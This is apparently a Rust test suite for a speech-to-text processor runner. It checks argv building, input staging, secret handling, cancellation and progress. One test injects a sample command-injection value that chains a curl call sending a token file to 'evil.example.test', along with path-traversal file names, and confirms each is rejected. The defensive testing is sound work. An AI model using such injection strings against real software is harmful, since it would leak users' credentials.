//! The processor contract suite, driven by the scripted processor and a virtual clock.

use ma_processor::scripted::ScriptedRunner;
use ma_processor::*;
use std::cell::Cell;
use std::collections::BTreeMap;

struct CellClock<'a>(&'a Cell<u64>);
impl Clock for CellClock<'_> {
    fn now_ms(&self) -> u64 {
        self.0.get()
    }
}

fn template() -> ArgvTemplate {
    let mut params = BTreeMap::new();
    params.insert("threads".into(), ParamType::Int { min: 1, max: 64 });
    params.insert(
        "language".into(),
        ParamType::Enum {
            values: vec!["ja".into(), "en".into()],
        },
    );
    params.insert("input".into(), ParamType::StagedFile);
    params.insert("translate".into(), ParamType::Bool);
    ArgvTemplate {
        program: "example-stt.exe".into(),
        args: vec![
            "--threads".into(),
            "{threads}".into(),
            "--language".into(),
            "{language}".into(),
            "--translate={translate}".into(),
            "{input}".into(),
        ],
        params,
    }
}

#[test]
fn config_value_never_reaches_a_shell() {
    let t = template();
    let hostile = "4 && curl http://evil.example.test/$(type token.txt)";
    let mut values = BTreeMap::new();
    values.insert("threads".to_string(), ParamValue::Text(hostile.into()));
    values.insert("language".to_string(), ParamValue::Text("ja".into()));
    values.insert("input".to_string(), ParamValue::Text("000000.wav".into()));
    values.insert("translate".to_string(), ParamValue::Bool(false));
    // type-rejected: an int parameter does not accept text
    assert!(matches!(
        build_argv(&t, &values),
        Err(Failure::InvalidInput { .. })
    ));
    // an enum parameter rejects anything outside its values, including a shell-looking one
    values.insert("threads".to_string(), ParamValue::Int(4));
    values.insert("language".to_string(), ParamValue::Text(hostile.into()));
    assert!(matches!(
        build_argv(&t, &values),
        Err(Failure::InvalidInput { .. })
    ));
    // a staged file name rejects separators and traversal
    values.insert("language".to_string(), ParamValue::Text("ja".into()));
    for bad in ["../meeting", "C:\\Users\\x\\token.txt", "sub/dir.wav", ""] {
        values.insert("input".to_string(), ParamValue::Text(bad.into()));
        assert!(
            matches!(build_argv(&t, &values), Err(Failure::InvalidInput { .. })),
            "{bad}"
        );
    }
    // a value that passes its type is exactly one literal argument, whatever it contains
    values.insert("input".to_string(), ParamValue::Text("000000.wav".into()));
    let argv = build_argv(&t, &values).unwrap();
    assert_eq!(
        argv,
        [
            "--threads",
            "4",
            "--language",
            "ja",
            "--translate=false",
            "000000.wav"
        ]
    );
    let spec = ChildSpec::new(&t.program, argv);
    let line = spec.visible_command_line();
    assert_eq!(line[0], "example-stt.exe");
    assert!(line
        .iter()
        .all(|a| !a.contains("&&") && !a.contains("$(") && !a.contains('|')));
    assert!(
        !line.iter().any(|a| a.contains("sh") && a.contains("-c")),
        "no shell is ever invoked"
    );
    // out-of-range ints are rejected too
    values.insert("threads".to_string(), ParamValue::Int(0));
    assert!(matches!(
        build_argv(&t, &values),
        Err(Failure::InvalidInput { .. })
    ));
    // unknown placeholder names are a manifest error, not silently empty
    let mut broken = template();
    broken.args.push("{model}".into());
    values.insert("threads".to_string(), ParamValue::Int(4));
    assert!(matches!(
        build_argv(&broken, &values),
        Err(Failure::InvalidInput { .. })
    ));
}

#[test]
fn staging_dir_contains_only_declared_inputs() {
    let meeting = tempfile::tempdir().unwrap();
    let root = tempfile::tempdir().unwrap();
    // the whole meeting folder, of which only two chunks are declared
    let chunks = meeting.path().join("chunks/mic");
    std::fs::create_dir_all(&chunks).unwrap();
    for n in ["000000.wav", "000001.wav", "000002.wav"] {
        std::fs::write(chunks.join(n), n.as_bytes()).unwrap();
    }
    std::fs::write(meeting.path().join("transcript.json"), b"{}").unwrap();
    std::fs::write(meeting.path().join("manifest.json"), b"{}").unwrap();
    let declared = vec![chunks.join("000000.wav"), chunks.join("000002.wav")];
    let staged_path;
    {
        let staged =
            StagedDir::create(root.path(), "job-1", &declared, "S-1-5-21-1-2-3-1001").unwrap();
        staged_path = staged.path().to_path_buf();
        assert_eq!(
            staged.listing().unwrap(),
            ["000000.wav", "000002.wav"],
            "exactly the declared inputs and nothing else"
        );
        assert_eq!(staged.declared(), ["000000.wav", "000002.wav"]);
        assert_eq!(
            std::fs::read(staged.path().join("000002.wav")).unwrap(),
            b"000002.wav"
        );
        assert_eq!(staged.owner_sid, "S-1-5-21-1-2-3-1001");
        assert!(staged.path().starts_with(root.path()));
        // a directory is not an input
        assert_eq!(
            StagedDir::create(
                root.path(),
                "job-2",
                &[meeting.path().to_path_buf()],
                "S-1-0-0"
            )
            .unwrap_err(),
            StagingError::NotAFile(meeting.path().to_path_buf())
        );
        // two inputs with the same file name cannot be staged
        let other = meeting.path().join("000000.wav");
        std::fs::write(&other, b"x").unwrap();
        assert_eq!(
            StagedDir::create(
                root.path(),
                "job-3",
                &[chunks.join("000000.wav"), other],
                "S-1-0-0"
            )
            .unwrap_err(),
            StagingError::NameCollision("000000.wav".into())
        );
    }
    assert!(!staged_path.exists(), "removed when the job ends");
    assert!(
        meeting.path().join("transcript.json").exists(),
        "the meeting folder is untouched"
    );
}

#[test]
fn unsupported_language_is_typed_refusal() {
    let p = ScriptedProcessor::transcription(&["ja", "en"]);
    let ok = ProcessorRequest {
        kind: ProcessorKind::Transcription,
        language: Some("ja".into()),
        input_seconds: 600,
        gpu_available: false,
    };
    assert_eq!(p.capability.check(&ok), Ok(()));
    let mut fr = ok.clone();
    fr.language = Some("fr".into());
    assert!(matches!(
        p.capability.check(&fr),
        Err(Failure::Unsupported { .. })
    ));
    let mut wrong_kind = ok.clone();
    wrong_kind.kind = ProcessorKind::Summarization;
    assert!(matches!(
        p.capability.check(&wrong_kind),
        Err(Failure::Unsupported { .. })
    ));
    let mut too_long = ok.clone();
    too_long.input_seconds = 5 * 3600;
    assert!(matches!(
        p.capability.check(&too_long),
        Err(Failure::Unsupported { .. })
    ));
    let mut gpu = ScriptedProcessor::transcription(&["ja"]);
    gpu.capability.needs_gpu = true;
    assert!(
        matches!(gpu.capability.check(&ok), Err(Failure::Unsupported { .. })),
        "needs a GPU that is not there"
    );
    // language-agnostic summarization accepts any language
    let mut summarizer = ScriptedProcessor::transcription(&[]);
    summarizer.capability.kind = ProcessorKind::Summarization;
    assert_eq!(
        summarizer.capability.check(&ProcessorRequest {
            kind: ProcessorKind::Summarization,
            language: Some("de".into()),
            input_seconds: 10,
            gpu_available: false
        }),
        Ok(())
    );
    // the manifest schema accepts a well-formed manifest and rejects a shell-shaped template
    let schema: serde_json::Value = serde_json::from_str(include_str!(
        "../../../contracts/processor/processor-manifest.schema.json"
    ))
    .unwrap();
    let validator = jsonschema::validator_for(&schema).unwrap();
    let manifest = serde_json::json!({ "processor_id": "example-stt", "version": "1.0.0", "capability": { "kind": "transcription", "languages": ["ja", "en"], "needs_gpu": false, "max_input_seconds": 14400, "streaming": false, "egress_hosts": [], "runs_in": "host" }, "model": { "model_id": "example-small", "sha256": "ab".repeat(32) }, "argv_template": { "program": "example-stt.exe", "args": ["--threads", "{threads}"], "params": { "threads": { "type": "int", "min": 1, "max": 64 } } }, "secrets": [{ "purpose": "example-api", "delivery": "environment" }] });
    assert!(validator.is_valid(&manifest));
    let mut argv_secret = manifest.clone();
    argv_secret["secrets"][0]["delivery"] = serde_json::Value::String("argv".into());
    assert!(
        !validator.is_valid(&argv_secret),
        "a secret delivered by argv cannot be declared"
    );
}

#[test]
fn model_digest_mismatch_is_permanent_failure() {
    let dir = tempfile::tempdir().unwrap();
    let model = dir.path().join("model.bin");
    std::fs::write(&model, b"weights v1").unwrap();
    use sha2::Digest;
    let good = hex::encode(sha2::Sha256::digest(b"weights v1"));
    assert_eq!(verify_model_digest(&model, &good), Ok(()));
    // replaced on disk between download and use
    std::fs::write(&model, b"weights v1 (tampered)").unwrap();
    assert_eq!(
        verify_model_digest(&model, &good),
        Err(Failure::Permanent {
            reason: "model digest mismatch".into()
        })
    );
    assert!(matches!(
        verify_model_digest(&dir.path().join("missing.bin"), &good),
        Err(Failure::Permanent { .. })
    ));
}

#[test]
fn progress_is_monotonic() {
    let mut p = ProgressTracker::new(10);
    assert_eq!(p.report(3, 100), 3);
    assert_eq!(p.report(2, 200), 3, "a regression is rejected");
    assert_eq!(p.regressions_rejected, 1);
    assert_eq!(p.report(7, 300), 7);
    assert_eq!(p.report(12, 400), 10, "clamped to the total");
    let reported: Vec<u32> = p.reports.iter().map(|(_, c)| *c).collect();
    assert!(reported.windows(2).all(|w| w[0] <= w[1]));
    // the ETA follows observed throughput, not a constant factor
    let mut q = ProgressTracker::new(4);
    assert_eq!(q.eta_ms(), None);
    q.record_item_duration(1_000);
    q.report(1, 1_000);
    assert_eq!(q.eta_ms(), Some(3_000));
    q.record_item_duration(3_000);
    q.report(2, 4_000);
    assert_eq!(
        q.eta_ms(),
        Some(4_000),
        "trailing average of 2 s over 2 remaining items"
    );
    // the runner reports once per item and never decreases
    let clock = Cell::new(0);
    let mut proc = ScriptedProcessor::transcription(&["ja"]);
    let mut runner = ScriptedRunner {
        processor: &mut proc,
        clock: &clock,
    };
    let report = run_items(
        &mut runner,
        5,
        &CancellationToken::default(),
        &CellClock(&clock),
        &|| None,
    );
    assert_eq!(report.outcome, Ok(()));
    assert_eq!(report.completed_items, 5);
    let seq: Vec<u32> = report.progress.reports.iter().map(|(_, c)| *c).collect();
    assert_eq!(seq, [1, 2, 3, 4, 5]);
}

/// Cancels at the start of item `cancel_at_ordinal` (as a UI would mid-job) and records when.
struct CancelDuring<'a> {
    inner: &'a mut ScriptedRunner<'a>,
    cancel: CancellationToken,
    cancel_at_ordinal: u32,
    at: &'a Cell<Option<u64>>,
    clock: &'a Cell<u64>,
}
impl ItemRunner for CancelDuring<'_> {
    fn run(&mut self, ordinal: u32, cancel: &CancellationToken) -> ItemOutcome {
        if ordinal == self.cancel_at_ordinal {
            self.cancel.cancel();
            self.at.set(Some(self.clock.get()));
        }
        self.inner.run(ordinal, cancel)
    }
}

#[test]
fn cancellation_observed_within_bound() {
    // a cooperative processor: cancel arrives during item 2, observed at the next item boundary
    let clock = Cell::new(0);
    let cancel = CancellationToken::default();
    let cancel_at = Cell::new(None);
    let mut proc = ScriptedProcessor::transcription(&["ja"]).with(Script::ItemCostMs(1_000));
    let mut runner = ScriptedRunner {
        processor: &mut proc,
        clock: &clock,
    };
    let mut wrap = CancelDuring {
        inner: &mut runner,
        cancel: cancel.clone(),
        cancel_at_ordinal: 2,
        at: &cancel_at,
        clock: &clock,
    };
    let report = run_items(&mut wrap, 10, &cancel, &CellClock(&clock), &|| {
        cancel_at.get()
    });
    assert_eq!(report.outcome, Err(Failure::Cancelled));
    assert!(report.completed_items <= 3);
    assert!(
        report.cancel_latency_ms.unwrap() <= CANCELLATION_BOUND_MS,
        "{:?}",
        report.cancel_latency_ms
    );
    // a processor whose FFI call blocks for the whole job fails the bound: the runner reports the
    // measured cancel-to-stop interval, not merely that a flag was set
    let clock = Cell::new(0);
    let cancel = CancellationToken::default();
    let cancel_at = Cell::new(None);
    let mut proc =
        ScriptedProcessor::transcription(&["ja"]).with(Script::IgnoreCancellationFor(60_000));
    let mut runner = ScriptedRunner {
        processor: &mut proc,
        clock: &clock,
    };
    let mut wrap = CancelDuring {
        inner: &mut runner,
        cancel: cancel.clone(),
        cancel_at_ordinal: 0,
        at: &cancel_at,
        clock: &clock,
    };
    let report = run_items(&mut wrap, 3, &cancel, &CellClock(&clock), &|| {
        cancel_at.get()
    });
    assert_eq!(report.outcome, Err(Failure::Cancelled));
    assert!(
        report.cancel_latency_ms.unwrap() > CANCELLATION_BOUND_MS,
        "the blocking processor is caught by the bound: {:?}",
        report.cancel_latency_ms
    );
}

#[test]
fn per_item_cost_does_not_grow() {
    let clock = Cell::new(0);
    let mut proc = ScriptedProcessor::transcription(&["ja"]).with(Script::ItemCostMs(100));
    let mut runner = ScriptedRunner {
        processor: &mut proc,
        clock: &clock,
    };
    let report = run_items(
        &mut runner,
        240,
        &CancellationToken::default(),
        &CellClock(&clock),
        &|| None,
    );
    assert_eq!(report.completed_items, 240);
    let d = report.progress.item_durations_ms();
    let first: u64 = d[..20].iter().sum::<u64>() / 20;
    let last: u64 = d[220..].iter().sum::<u64>() / 20;
    assert!(
        last <= first * 2,
        "per-item cost is bounded: first {first} ms, last {last} ms"
    );
    // the quadratic anti-pattern is caught by the same assertion
    let clock = Cell::new(0);
    let mut bad = ScriptedProcessor::transcription(&["ja"]).with(Script::AccumulatingContext {
        base_ms: 100,
        per_prior_ms: 10,
    });
    let mut runner = ScriptedRunner {
        processor: &mut bad,
        clock: &clock,
    };
    let report = run_items(
        &mut runner,
        240,
        &CancellationToken::default(),
        &CellClock(&clock),
        &|| None,
    );
    let d = report.progress.item_durations_ms();
    let first: u64 = d[..20].iter().sum::<u64>() / 20;
    let last: u64 = d[220..].iter().sum::<u64>() / 20;
    assert!(
        last > first * 2,
        "accumulating context makes item N cost O(N): first {first} ms, last {last} ms"
    );
}

#[test]
fn budget_overrun_emits_warning_not_failure() {
    let clock = Cell::new(0);
    // items cost 2x their budget
    let mut slow =
        ScriptedProcessor::transcription(&["ja"]).with(Script::ItemCostMs(2 * ITEM_BUDGET_MS));
    let mut runner = ScriptedRunner {
        processor: &mut slow,
        clock: &clock,
    };
    let report = run_items(
        &mut runner,
        4,
        &CancellationToken::default(),
        &CellClock(&clock),
        &|| None,
    );
    assert_eq!(
        report.outcome,
        Ok(()),
        "overrun is a warning, not a failure"
    );
    assert_eq!(report.completed_items, 4);
    assert_eq!(report.warnings.len(), 1);
    assert!(matches!(
        report.warnings[0],
        Warning::BudgetExceeded {
            budget_ms: 120_000,
            elapsed_ms: 240_000
        }
    ));
    // under budget: no warning
    let clock = Cell::new(0);
    let mut fast = ScriptedProcessor::transcription(&["ja"]).with(Script::ItemCostMs(100));
    let mut runner = ScriptedRunner {
        processor: &mut fast,
        clock: &clock,
    };
    let report = run_items(
        &mut runner,
        4,
        &CancellationToken::default(),
        &CellClock(&clock),
        &|| None,
    );
    assert!(report.warnings.is_empty());
    // the stall watch is a different outcome from a crash, and preserves completed items
    let mut watch = StallWatch::start(0);
    watch.progress(
        &ProgressFrame {
            completed_items: 7,
            total_items: 20,
        },
        10_000,
    );
    assert_eq!(watch.check(10_000 + STALL_TIMEOUT_MS - 1), None);
    let (outcome, failure) = watch.check(10_000 + STALL_TIMEOUT_MS).unwrap();
    assert_eq!(outcome, ExitOutcome::NoProgress { completed_items: 7 });
    assert_eq!(
        failure,
        Failure::Retryable {
            after_ms: 1_000,
            cause: RetryCause::NoProgress
        }
    );
    assert_eq!(
        classify_exit(Some(134), None),
        ExitOutcome::HostCrashed,
        "abort"
    );
    assert_eq!(
        classify_exit(None, None),
        ExitOutcome::HostCrashed,
        "unreadable status is never success"
    );
    assert_eq!(
        classify_exit(Some(0), None),
        ExitOutcome::HostCrashed,
        "exit 0 without a result frame"
    );
    assert!(matches!(
        classify_exit(
            Some(0),
            Some(ResultFrame::Succeeded {
                completed_items: 3,
                output_digest: "x".into()
            })
        ),
        ExitOutcome::Result(_)
    ));
    assert_eq!(HOST_MEMORY_CAP_BYTES, 4 * 1024 * 1024 * 1024);
}

#[test]
fn secret_never_appears_in_child_argv() {
    let t = template();
    let mut values = BTreeMap::new();
    values.insert("threads".to_string(), ParamValue::Int(8));
    values.insert("language".to_string(), ParamValue::Text("en".into()));
    values.insert("input".to_string(), ParamValue::Text("000000.wav".into()));
    values.insert("translate".to_string(), ParamValue::Bool(true));
    let argv = build_argv(&t, &values).unwrap();
    let marker = "ZZ-SECRET-API-KEY-ZZ";
    let spec = ChildSpec::new(&t.program, argv)
        .with_secret_env("EXAMPLE_API_KEY", SecretValue::new(marker))
        .with_secret_stdin(SecretValue::new(marker));
    let visible = spec.visible_command_line().join(" ");
    assert!(!visible.contains(marker), "{visible}");
    assert!(
        !format!("{spec:?}").contains(marker),
        "Debug renders *** for secrets"
    );
    assert_eq!(spec.secret_env[0].0, "EXAMPLE_API_KEY");
    assert_eq!(spec.secret_env[0].1.expose(), marker.as_bytes());
    // the request frame that crosses to the host carries argv and no secret either
    let frame = RequestFrame {
        job_id: "job-1".into(),
        processor_id: "example-stt".into(),
        staged_dir: "C:\\staging\\job-1".into(),
        argv: spec.argv.clone(),
        work_items: 3,
        script: vec![],
    };
    assert!(!serde_json::to_string(&frame).unwrap().contains(marker));
    // there is no way to put a SecretValue into argv: the type has no Display and no Serialize
    let _no_display: Option<fn(&SecretValue) -> String> = None;
}
